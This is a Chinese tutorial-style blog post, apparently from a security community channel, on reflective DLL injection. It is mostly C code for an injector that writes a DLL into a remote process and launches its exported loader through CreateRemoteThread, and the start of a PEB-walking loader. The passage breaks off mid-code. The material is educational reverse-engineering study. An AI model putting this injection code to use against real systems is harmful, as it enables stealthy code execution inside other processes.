---
title: 反射式注入技术浅析
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458589041&idx=1&sn=d6ac5ccbfd4e3343e192ddbf90411481&chksm=b18c27fb86fbaeed0df1fbadae1c3870a2409d2fb44d1790ecb33e9e6c15a7bf3cca1c2bdf83&scene=58&subscene=0#rd
source: 看雪学苑
date: 2025-01-22
fetch_date: 2025-10-06T20:10:45.783354
---

# 反射式注入技术浅析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GhB2YhPKZEztqohjYnMYVp2spLHD0u7KjMwaNLM1siaQXIhRYUhQIuDvuLoRPoXY7xGA3miaDZ83rQ/0?wx_fmt=jpeg)

# 反射式注入技术浅析

zzzhangyu

看雪学苑

感觉反射式注入与普通注入的最大区别就是不加载系统的API去加载我们的文件，也就是不调用Loadlibrary，而是让我们手动实现装载过程，网上的文章说可以在DLL的导出表中添加ReflectiveLoader函数调用它。

由于调用它的时候，不确定DLL文件写到目标进程的哪个虚拟空间上，所以这个编写的函数必须与地址无关，这种代码叫（position-independent code）PIC，暂时理解成在DLL的导出表写入一个函数，这个函数的功能就是PELOADER。

### 工具

一个注射器和一个被注入的DLL

### 涉及知识

PEB和TEB，PEloader，dll注入（创建远程线程）,函数指针，手动实现strncpy,memmove等。

### X64dbg调试

我们需要x64dbg去调试查看函数的调用，内存窗口等查看值是否在里面，这里在文件—附加里面可以附加进程。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GhB2YhPKZEztqohjYnMYVp1QNhicfbUbVAkcZ6uNfAsUjfN5ZMmibUg5ItXPCbdzJKicfw7sCeOCuJw/640?wx_fmt=png&from=appmsg)

然后用vs去附加进程调试

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GhB2YhPKZEztqohjYnMYVppYu4dxyaoENBxyOWGfVJPgUUtfia8ZDbPIV69lkWZ0zSo1icUlf83PHg/640?wx_fmt=png&from=appmsg)

这里可以添加监视，然后复制值到x64dbg里面，就可以实时监视我们的文件在如何被操作。

### 注射器

大致流程

1.将注入DLL读入自身内存

2.利用VirtualAlloc和WriteProcessMemory在目标进程中写入待注入的DLL文件

3.利用CreateRemoteThread等函数启动目标进程的ReflectiveLoader

#### 一：遍历DLL的导出表

因为我的注射器采用的是以创建远程线程为模板，具体的代码不过多分析，就分析和普通创建远程线程不一样的调用自身函数的地方，前面所说，我们是把类似于PEloader的代码写成一个函数放在DLL文件的导出表当中。

```
DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer)
{
    UINT_PTR BaseAddress = 0;//UINT_PTR是无符号指针
    UINT_PTR uiNT = 0;
    UINT_PTR uiNameArray = 0;
    UINT_PTR uiAddressArray = 0;
    UINT_PTR uiNameOrdinals = 0;
    DWORD dwCounter = 0;
#ifdef WIN_X64
    DWORD dwCompiledArch = 2;
#else
    // This will catch Win32 and WinRT.
    DWORD dwCompiledArch = 1;
#endif

    BaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

    uiNT = BaseAddress + ((PIMAGE_DOS_HEADER)BaseAddress)->e_lfanew;

    //这里是主要判断当前的位数于dll位数是否一致
    if (((PIMAGE_NT_HEADERS)uiNT)->OptionalHeader.Magic == 0x010B) // PE32
    {
        if (dwCompiledArch != 1)
            return 0;
    }
    else if (((PIMAGE_NT_HEADERS)uiNT)->OptionalHeader.Magic == 0x020B) // PE64
    {
        if (dwCompiledArch != 2)
            return 0;
    }
    else
    {
        return 0;
    }
    //u1NameArray是PE文件导出表的条目索引
    uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiNT)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    //uiNT是导出表的地址
    uiNT = BaseAddress + RVA(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, BaseAddress);
   //导出表的函数名称数组
    uiNameArray = BaseAddress + RVA(((PIMAGE_EXPORT_DIRECTORY)uiNT)->AddressOfNames, BaseAddress);
   //导出表的函数地址数组
    uiAddressArray = BaseAddress + RVA(((PIMAGE_EXPORT_DIRECTORY)uiNT)->AddressOfFunctions, BaseAddress);
    //导出表的名称序号数组
    uiNameOrdinals = BaseAddress + RVA(((PIMAGE_EXPORT_DIRECTORY)uiNT)->AddressOfNameOrdinals, BaseAddress);
    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiNT)->NumberOfNames;
    while (dwCounter--)
    {
        //这就是核心的遍历函数
        char* cpExportedFunctionName = (char*)(BaseAddress + RVA(*(DWORD*)(uiNameArray), BaseAddress));
        printf("Exported function: %s\n", cpExportedFunctionName);

        if (strstr(cpExportedFunctionName, "reflectiveinject") != NULL)
        {//strstr函数是查找，从核心函数中查找

            uiAddressArray = BaseAddress + RVA(((PIMAGE_EXPORT_DIRECTORY)uiNT)->AddressOfFunctions, BaseAddress);

            uiAddressArray += (*(WORD*)(uiNameOrdinals) * sizeof(DWORD));

            return RVA(*(DWORD*)(uiAddressArray), BaseAddress);
        }

        uiNameArray += sizeof(DWORD);

        uiNameOrdinals += sizeof(WORD);
    }

    return 0;
}
```

RVA函数是将虚拟地址RVA转换为文件的偏移量，这里通过遍历导出函数名称表去寻找函数，找到之后返回这个函数的地址的偏移量。

```
DWORD RVA(DWORD dwRva, UINT_PTR BaseAddress)
{//这个代码是将相对虚拟地址RVA转换成文件的偏移量
    WORD wIndex = 0;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;

    pNtHeaders = (PIMAGE_NT_HEADERS)(BaseAddress + ((PIMAGE_DOS_HEADER)BaseAddress)->e_lfanew);

    pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);
    //这个是找节区头，可选头加上可选头的大小，下一个就是节区表头
    //就是查找给的RVA是属于哪个节区，其目的就是找到文件偏移地址
    if (dwRva < pSectionHeader[0].PointerToRawData)
        return dwRva;
    //这是检查dwRva是不是位于文件的头部区域中

    for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
    {
        //这就是遍历所有节了，找到dwRva的节
        if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
            //sizeofrawdata是在文件中对齐的尺寸，这是如果dwRVa在当前节的范围内就找到了
            return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
        //这里的换算是，目的是找到函数的文件偏移地址，这个节区头的相对虚拟地址减去这个节区的相对虚拟地址等于节中的偏移加上文件的起始偏移
    }

    return 0;
}
```

####

#### 二：注入dll

这里就很明显了，先是申请内存装DLL，再把DLL写进去，接下来就是去加载DLL，注意，CreatRemoteThread的第四个参数的强制类型转换是转换成远程函数的入口地址，第五个参数是给函数的参数。

```
int InjectDllToProcess(HANDLE hProcess, void* dllBuffer, size_t dllSize) {
    // 获取 DOS 头部
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Invalid DOS header.\n");
        return 0;
    }

    // 获取 NT 头部
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBuffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("Invalid NT header.\n");
        return 0;
    }

    //// 获取入口点
    //DWORD_PTR entryPoint = (DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;

    DWORD functionOffest = GetReflectiveLoaderOffset(dllBuffer);

    // 在目标进程中分配内存
    LPVOID remoteDllBase = VirtualAllocEx(hProcess, NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteDllBase == NULL) {
        printf("Failed to allocate memory in target process.\n");
        return 0;
    }

    // 将 DLL 内容写入目标进程
    if (!WriteProcessMemory(hProcess, remoteDllBase, dllBuffer, dllSize, NULL)) {
        printf("Failed to write DLL data to target process memory.\n");
        return 0;
    }
    LPTHREAD_START_ROUTINE function = (LPTHREAD_START_ROUTINE)((ULONG_PTR)remoteDllBase + functionOffest);
        // 创建远程线程执行入口点
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)function, remoteDllBase, 0, NULL);
       if (hThread == NULL) {
        printf("Failed to create remote thread.\n");
        return 0;
    }
}
```

源码放在最后

### DLL的reflectiveinject

#### 一：通过PEB去加载模块的kernerl32DLL

```
extern "C" _declspec(dllexport) int reflectiveinject(char* Buf) {
    int checkPE = 0;
    int i = 0;
    PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)Buf;
    PIMAGE_NT_HEADERS64 ntheader = (PIMAGE_NT_HEADERS64)((ULONG_PTR)Buf + dosheader->e_lfanew);
    if (dosheader->e_magic == IMAGE_DOS_SIGNATURE) {
        if (ntheader->Signature == IMAGE_NT_SIGNATURE) {
            checkPE = 1;
        }
    }
    if (checkPE == 0) {
        //printf("this is not dll\n");
        return 0;
    }
    // ULONG_PTR Buf = caller();
   // printf("Buf address: %p\n", &Buf);
    //下面是获取kernerl32address和nt
    PVOID peb = (PEB*)__readgsqword(0x60);
    if (!peb) {
        return FALSE;
    }
    PVOID LDR = *(PVOID64**)((BYTE*)peb + 0x18);//这个指针遍历加载信息列表peb本身就是一个指针
    UNICODE_STRING* fullname;
    LIST_ENTRY* list = NULL;//好像是链表节点指针，指向模块列表的当前模块
    list = (LIST_ENTRY*)(*(PVOID64**)((BYTE*)LDR + 0x30));//30是指向存储模块名称的偏移
    LIST_ENTRY* current = list->Flink;
    wchar_t temp[13];
    HMODULE kernerl32 = NULL;
    wchar_t kerner[13] = L"kernel32.dll";
    kerner[0] = L'k';
    kerner[1] = L'e';
    kerner[2] = L'r';
    kerner[3] = L'n';
    kerner[4] = L'e';
    kerner[5] = L'l';
    kerner[6] = L'3';
    kerner[7] = L'2';
    kerner[8] = L'.';
    kerner[9] = L'd';
    kerner[10] = L'l';
    kerner[11] = L'l';
    kerner[12] = L'\0';

    while (current != list) {
        // 获取当前模块的入口
        PLDR_DATA_TABLE_ENTRY start = (LDR_DATA_TABLE_ENTRY*)((PCHAR)current - 0x10);

        // 检查模块有效性
        if (start && start->FullDllName.Buffer) {
            WCHAR* buffer = start->FullDllName.Buffer;
            WCHAR*...